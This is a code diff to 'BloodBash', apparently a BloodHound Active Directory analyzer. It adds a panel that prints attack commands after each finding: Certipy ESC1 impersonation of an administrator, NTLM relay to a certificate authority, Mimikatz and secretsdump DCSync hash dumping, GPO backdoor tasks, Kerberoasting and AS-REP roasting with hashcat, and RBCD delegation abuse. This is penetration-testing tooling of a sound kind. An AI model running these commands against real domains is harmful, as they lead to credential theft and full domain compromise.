@@ -12,7 +12,6 @@ from rich.progress import Progress
 from rich import print as rprint
 from tqdm import tqdm
 import time
-import re
 
 console = Console()
 
@@ -33,6 +32,116 @@ TYPE_FROM_META = {
     "aiacas": "AIA CA",
     "ntauthstores": "NTAuth Store",
 }
+
+# ────────────────────────────────────────────────
+# Abuse Suggestions Helper
+# ────────────────────────────────────────────────
+def print_abuse_panel(vuln_type: str):
+    title = f"Abuse Suggestions: {vuln_type}"
+    content = ""
+    border = "red"
+
+    if vuln_type == "ESC1-ESC8 (AD CS)":
+        content = """
+[bold red]Impact:[/bold red] Certificate-based privilege escalation (ESC1–ESC8) → impersonate users (often admins/DA), relay attacks, or obtain high-value certificates.
+
+Common tools: Certipy[](https://github.com/ly4k/Certipy), ntlmrelayx.py (Impacket)
+
+ESC1/ESC2/ESC6 examples:
+certipy req -u lowpriv@domain.local -p 'Password!' -ca 'DOMAIN-CA' \\
+    -template VulnerableTemplate -upn administrator@domain.local
+
+ESC8 (NTAuth relay):
+ntlmrelayx.py -t https://ca.domain.local/certsrv/certfnsh.asp --adcs --template VulnerableTemplate -smb2support
+
+Warning: Requires network access to CA/DC + low-priv creds. Authorized testing only.
+"""
+    elif vuln_type == "DCSync":
+        content = """
+[bold red]Impact:[/bold red] Dump NTDS hashes (krbtgt, admins, etc.) → Golden Ticket, pass-the-hash, domain compromise.
+
+Tools: Mimikatz or Impacket secretsdump
+
+Mimikatz:
+lsadump::dcsync /domain:domain.local /user:krbtgt
+lsadump::dcsync /domain:domain.local /all /csv
+
+Impacket:
+secretsdump.py domain/user:password@dc-ip -just-dc
+secretsdump.py -just-dc-ntds domain/user:password@dc-ip
+"""
+    elif vuln_type == "GPO Abuse":
+        content = """
+[bold yellow]Impact:[/bold yellow] Modify GPO → deploy malicious scheduled tasks/scripts → code execution / priv esc on affected machines.
+
+Tools: SharpGPOAbuse, pyGPOAbuse, PowerView
+
+SharpGPOAbuse example:
+SharpGPOAbuse.exe --gponame "VulnerableGPO" --computer "target$" --taskname "EvilTask" --task "powershell.exe -c evil.ps1"
+
+PowerView:
+New-GPOImmediateTask -TaskName "Backdoor" -Command "powershell.exe ..."
+"""
+    elif vuln_type == "Dangerous Permissions":
+        content = """
+[bold red]Impact:[/bold red] Varies by right — ResetPassword → account takeover; GenericAll → full control; WriteDacl → own object.
+
+Common abuses:
+
+- Reset/ForceChangePassword:
+  net user target NewPass123! /domain
+
+- GenericAll on user/group:
+  Add yourself or reset password
+
+- WriteDacl:
+  Grant self GenericAll then proceed
+
+Warning: Requires control of the principal with the dangerous right.
+"""
+    elif vuln_type == "Kerberoastable":
+        content = """
+[bold yellow]Impact:[/bold yellow] Request TGS → offline crack weak service account password.
+
+Tool: Impacket
+
+GetUserSPNs.py -request -outputfile hashes.txt domain/user:password@domain.local
+
+Crack:
+hashcat -m 13100 hashes.txt wordlist.txt
+"""
+    elif vuln_type == "AS-REP Roastable":
+        content = """
+[bold yellow]Impact:[/bold yellow] Request AS-REP without preauth → offline crack user hash.
+
+Tools: Rubeus or Impacket
+
+Rubeus:
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+
+Impacket:
+GetNPUsers.py domain/ -usersfile users.txt -format hashcat -dc-ip dc-ip
+
+Crack (mode 18200):
+hashcat -m 18200 hashes.asreproast wordlist.txt
+"""
+    elif vuln_type == "RBCD":
+        content = """
+[bold red]Impact:[/bold red] Resource-Based Constrained Delegation → S4U2Self/S4U2Proxy impersonation.
+
+Tool: Impacket rbcd.py
+
+rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' \\
+    -action write -dc-ip dc-ip domain/user:password
+
+Then use getST.py or Rubeus s4u.
+"""
+
+    if content:
+        console.print(Panel(content, title=title, border_style=border))
+    else:
+        console.print(f"[dim]No abuse example defined for {vuln_type}[/dim]")
+
 
 # ────────────────────────────────────────────────
 # Loading & Graph Building
@@ -106,7 +215,7 @@ def build_graph(nodes):
     return G, name_to_oid
 
 # ────────────────────────────────────────────────
-# VERBOSE SUMMARY (FIXED & IMPROVED)
+# VERBOSE SUMMARY
 # ────────────────────────────────────────────────
 def print_verbose_summary(G):
     console.rule("[bold magenta]VERBOSE SUMMARY[/bold magenta]")
@@ -164,7 +273,7 @@ def format_path(G, path):
     return " ".join(parts)
 
 # ────────────────────────────────────────────────
-# ADCS ESC1–ESC8 (Enhanced)
+# ADCS ESC1–ESC8
 # ────────────────────────────────────────────────
 def print_adcs_vulnerabilities(G):
     console.rule("[bold magenta]ADCS ESC Vulnerabilities (ESC1–ESC8)[/bold magenta]")
@@ -178,7 +287,7 @@ def print_adcs_vulnerabilities(G):
         incoming = G.in_edges(n, data=True)
         rights = {d['label'] for _, _, d in incoming}
 
-        # ESC1 / ESC2: Enrollee supplies subject + Enroll
+        # ESC1 / ESC2
         if 'Certificate Template' in d['type']:
             props = d['props']
             if 'Enroll' in rights and (
@@ -191,7 +300,7 @@ def print_adcs_vulnerabilities(G):
                     if edge['label'] == 'Enroll':
                         console.print(f"  → [green]{G.nodes[u]['name']}[/green] can Enroll")
 
-        # ESC3: No approval + dangerous rights
+        # ESC3
         if 'Certificate Template' in d['type'] and not d['props'].get('requiresmanagerapproval', False):
             dangerous = {'GenericAll', 'WriteDacl', 'WriteOwner', 'GenericWrite'}
             if any(r in rights for r in dangerous):
@@ -201,18 +310,20 @@ def print_adcs_vulnerabilities(G):
                     if edge['label'] in dangerous:
                         console.print(f"  → [green]{G.nodes[u]['name']}[/green] --[{edge['label']}]-->")
 
-        # ESC6: EDITF_ATTRIBUTESUBJECALTNAME2 + Enroll
+        # ESC6
         if 'Enterprise CA' in d['type'] and 'EDITF_ATTRIBUTESUBJECALTNAME2' in d['props'].get('flags', []):
             if 'Enroll' in rights:
                 found = True
                 console.print(f"[red]ESC6[/red]: [bold]{name}[/bold] (EDITF_ATTRIBUTESUBJECALTNAME2 + Enroll)")
 
-        # ESC8: Weak NTAuth
+        # ESC8
         if 'NTAuth Store' in d['type'] and 'GenericAll' in rights:
             found = True
             console.print(f"[red]ESC8[/red]: [bold]{name}[/bold] (GenericAll on NTAuth)")
 
-    if not found:
+    if found:
+        print_abuse_panel("ESC1-ESC8 (AD CS)")
+    else:
         console.print("[green]No obvious ESC1–ESC8 misconfigurations detected[/green]")
 
 # ────────────────────────────────────────────────
@@ -237,7 +348,9 @@ def print_gpo_abuse(G):
                 if edge['label'] in dangerous:
                     console.print(f"  → [green]{G.nodes[u]['name']}[/green] --[{edge['label']}]-->")
 
-    if not found:
+    if found:
+        print_abuse_panel("GPO Abuse")
+    else:
         console.print("[green]No dangerous GPO rights found[/green]")
 
 # ────────────────────────────────────────────────
@@ -261,11 +374,13 @@ def print_dcsync_rights(G):
                 found = True
                 console.print(f"[red]DCSync possible[/red]: [green]{G.nodes[u]['name']}[/green] --[{d['label']}]--> Domain")
 
-    if not found:
+    if found:
+        print_abuse_panel("DCSync")
+    else:
         console.print("[green]No DCSync rights detected[/green]")
 
 # ────────────────────────────────────────────────
-# RBCD (Resource-Based Constrained Delegation)
+# RBCD
 # ────────────────────────────────────────────────
 def print_rbcd(G):
     console.rule("[bold magenta]Resource-Based Constrained Delegation (RBCD)[/bold magenta]")
@@ -281,7 +396,9 @@ def print_rbcd(G):
             for tgt in props['msds-allowedtodelegateto']:
                 console.print(f"      - {tgt}")
 
-    if not found:
+    if found:
+        print_abuse_panel("RBCD")
+    else:
         console.print("[green]No RBCD configured computers found[/green]")
 
 # ────────────────────────────────────────────────
@@ -340,7 +457,10 @@ def print_dangerous_permissions(G):
             for principal_oid, right in dangerous_edges:
                 principal_name = G.nodes[principal_oid]['name']
                 console.print(f"  • [green]{principal_name}[/green] --[[yellow]{right}[/yellow]]--> {tname}")
-    if not found:
+
+    if found:
+        print_abuse_panel("Dangerous Permissions")
+    else:
         console.print("[green]No dangerous ACLs found on high-value objects[/green]")
 
 # ────────────────────────────────────────────────
@@ -356,7 +476,10 @@ def print_kerberoastable(G):
         if props.get('hasspn', False) and not props.get('sensitive', False) and props.get('enabled', True):
             found = True
             console.print(f"  • {d['name']}")
-    if not found:
+
+    if found:
+        print_abuse_panel("Kerberoastable")
+    else:
         console.print("[green]None found[/green]")
 
 def print_as_rep_roastable(G):
@@ -369,7 +492,10 @@ def print_as_rep_roastable(G):
         if props.get('dontreqpreauth', False) and props.get('enabled', True):
             found = True
             console.print(f"  • {d['name']}")
-    if not found:
+
+    if found:
+        print_abuse_panel("AS-REP Roastable")
+    else:
         console.print("[green]None found[/green]")
 
 # ────────────────────────────────────────────────
@@ -430,7 +556,7 @@ def export_results(G, output_prefix="bashound", format_type="md"):
 # Main
 # ────────────────────────────────────────────────
 def main():
-    parser = argparse.ArgumentParser(description="BloodBash - Advanced BloodHound Analyzer")
+    parser = argparse.ArgumentParser(description="BloodBash - Advanced BloodHound Analyzer with Abuse Suggestions")
     parser.add_argument('directory', nargs='?', default='.', help='Path to SharpHound JSON files')
 
     parser.add_argument('--shortest-paths', action='store_true')
